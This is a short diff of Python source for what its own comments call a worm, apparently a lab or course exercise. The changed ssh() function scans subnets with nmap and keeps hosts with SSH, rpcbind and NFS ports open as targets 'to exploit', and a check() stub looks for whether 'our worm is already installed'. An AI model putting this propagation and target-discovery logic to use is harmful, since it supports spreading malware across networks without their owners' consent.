@@ -34,9 +34,9 @@ def ssh():
     ssh_list = []                                                                   #A list is created to contain valid ip's to exploit
     for ip_range in subnet():                                                       #The subnets returned from the subnet function are iterated over                                                             #Define a list to contain ip's open on port 22
         nm = nmap.PortScanner()                                                     #Instantiate portscanner object
-        nm.scan(ip_range,'22')                                                      #Scan ports 10.0.2.0 - 10.0.2.256 on port 22
+        nm.scan(ip_range)                                                           #Scan ports 10.0.2.0 - 10.0.2.256
         for host in nm.all_hosts():                                                 #Create a for loop to iterate over the list of scanned hosts
-            if nm[host]['tcp'][22]['state'] == 'open':                              #Validate port 22 is open on 'host'
+            if nm[host]['tcp'][22]['state'] == 'open' and nm[host]['tcp'][111]['state'] == 'open' and nm[host]['tcp'][2049]['state'] == 'open':                              #Validate port 22 is open on 'host'
                 ssh_list.append(host)                                               #Add validated hosts to ssh_list
     return(ssh_list)                                                                #Return the contents of ssh_list
 def check():                                                                        #A check to determine if our worm is already installed on a target
